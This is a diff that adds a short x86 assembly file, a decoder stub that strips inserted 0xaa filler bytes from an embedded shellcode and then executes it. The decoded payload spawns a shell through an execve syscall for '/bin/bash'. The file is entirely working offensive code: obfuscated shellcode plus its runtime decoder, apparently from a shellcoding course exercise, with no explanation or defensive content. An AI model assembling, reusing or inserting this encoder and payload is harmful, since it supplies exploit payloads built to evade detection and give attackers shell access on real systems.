@@ -1,0 +1,35 @@
+; filename: insertion-decoder.nasm
+; author: lawly
+; description: stub for decoding shellcode via an insertion method
+
+section .text
+
+global _start
+_start:
+    jmp short call_decoder
+
+decoder:
+    pop esi                 ; source
+    mov edi, esi            ; destination
+
+    xor ecx, ecx
+    xor eax, eax
+
+decode:
+    inc edi                 ; goto next position in shellcode
+    inc ecx                 ; ECX = offset, always incrementing by 1
+    mov esi, edi
+    add esi, ecx            ; source = shellcode position + offset 
+                            ; this will skip our inserted bytes
+    
+    mov byte al, [esi]
+    mov byte [edi], al      ; replace current position with next byte in shellcode
+
+    cmp ecx, 29
+    jnz decode
+
+    jmp short shellcode
+
+call_decoder:
+    call decoder
+    shellcode: db 0x31, 0xaa, 0xc0, 0xaa, 0x50, 0xaa, 0x68, 0xaa, 0x62, 0xaa, 0x61, 0xaa, 0x73, 0xaa, 0x68, 0xaa, 0x68, 0xaa, 0x62, 0xaa, 0x69, 0xaa, 0x6e, 0xaa, 0x2f, 0xaa, 0x68, 0xaa, 0x2f, 0xaa, 0x2f, 0xaa, 0x2f, 0xaa, 0x2f, 0xaa, 0x89, 0xaa, 0xe3, 0xaa, 0x50, 0xaa, 0x89, 0xaa, 0xe2, 0xaa, 0x53, 0xaa, 0x89, 0xaa, 0xe1, 0xaa, 0xb0, 0xaa, 0x0b, 0xaa, 0xcd, 0xaa, 0x80, 0xaa
